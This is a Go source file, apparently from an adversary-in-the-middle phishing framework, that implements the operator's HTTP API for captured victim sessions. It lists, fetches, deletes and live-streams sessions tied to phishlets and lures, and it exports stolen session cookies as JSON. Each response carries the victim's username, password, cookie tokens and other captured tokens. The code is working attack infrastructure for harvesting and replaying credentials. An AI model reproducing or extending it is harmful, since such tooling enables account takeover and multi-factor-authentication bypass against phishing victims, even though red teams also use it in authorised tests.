package api

import (
	"encoding/json"
	"errors"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
	q := req.URL.Query()
	limit, offset := parsePagination(req)

	filter := aitm.SessionFilter{
		Phishlet: q.Get("phishlet"),
		Limit:    limit,
		Offset:   offset,
	}
	if q.Get("completed") == "true" {
		filter.CompletedOnly = true
	} else if q.Get("completed") == "false" {
		filter.IncompleteOnly = true
	}
	if sinceParam := q.Get("since"); sinceParam != "" {
		t, ok := parseRFC3339Param(w, "since", sinceParam)
		if !ok {
			return
		}
		filter.After = t
	}
	if untilParam := q.Get("until"); untilParam != "" {
		t, ok := parseRFC3339Param(w, "until", untilParam)
		if !ok {
			return
		}
		filter.Before = t
	}

	sessions, err := r.Sessions.List(filter)
	if err != nil {
		r.writeError(w, http.StatusInternalServerError, "failed to list sessions", err)
		return
	}

	countFilter := filter
	countFilter.Limit = 0
	countFilter.Offset = 0
	total, err := r.Sessions.Count(countFilter)
	if err != nil {
		r.writeError(w, http.StatusInternalServerError, "failed to count sessions", err)
		return
	}

	items := make([]sdk.SessionResponse, len(sessions))
	for i, s := range sessions {
		items[i] = sessionToResponse(s)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.SessionResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) getSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	sess, err := r.Sessions.Get(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			r.writeError(w, http.StatusNotFound, "session does not exist", err)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to get session", err)
		}
		return
	}
	writeJSON(w, http.StatusOK, sessionToResponse(sess))
}

func (r *Router) deleteSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.Sessions.Delete(id); err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			r.writeError(w, http.StatusNotFound, "session does not exist", err)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to delete session", err)
		}
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) exportSessionCookies(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	data, err := r.Sessions.ExportCookiesJSON(id)
	if err != nil {
		if errors.Is(err, aitm.ErrNotFound) {
			r.writeError(w, http.StatusNotFound, "session does not exist", err)
		} else {
			r.writeError(w, http.StatusInternalServerError, "failed to export session", err)
		}
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func (r *Router) streamSessions(w http.ResponseWriter, req *http.Request) {
	sse, ok := newSSEWriter(w)
	if !ok {
		r.writeError(w, http.StatusInternalServerError, "streaming not supported", nil)
		return
	}

	if err := sse.WriteEvent("connected", []byte(`{"status":"connected"}`)); err != nil {
		return
	}

	for event := range r.Sessions.Subscribe(req.Context()) {
		if err := r.sendSessionEvent(sse, event); err != nil {
			return
		}
	}
}

func (r *Router) sendSessionEvent(sse *sseWriter, event aitm.Event) error {
	sess, ok := event.Payload.(*aitm.Session)
	if !ok {
		return nil
	}
	data, err := json.Marshal(sessionToResponse(sess))
	if err != nil {
		r.Logger.Error("failed to marshal session for SSE", "event", event.Type, "error", err)
		return nil // skip this event, don't close the stream
	}
	return sse.WriteEvent(string(event.Type), data)
}

func sessionToResponse(s *aitm.Session) sdk.SessionResponse {
	cookies := make(map[string]map[string]string)
	for domain, byName := range s.CookieTokens {
		cookies[domain] = make(map[string]string)
		for name, tok := range byName {
			cookies[domain][name] = tok.Value
		}
	}
	return sdk.SessionResponse{
		ID:           s.ID,
		Phishlet:     s.Phishlet,
		LureID:       s.LureID,
		RemoteAddr:   s.RemoteAddr,
		UserAgent:    s.UserAgent,
		JA4Hash:      s.JA4Hash,
		BotScore:     s.BotScore,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		LureParams:   s.LureParams,
		CookieTokens: cookies,
		BodyTokens:   s.BodyTokens,
		HTTPTokens:   s.HTTPTokens,
		StartedAt:    s.StartedAt,
		CompletedAt:  s.CompletedAt,
	}
}
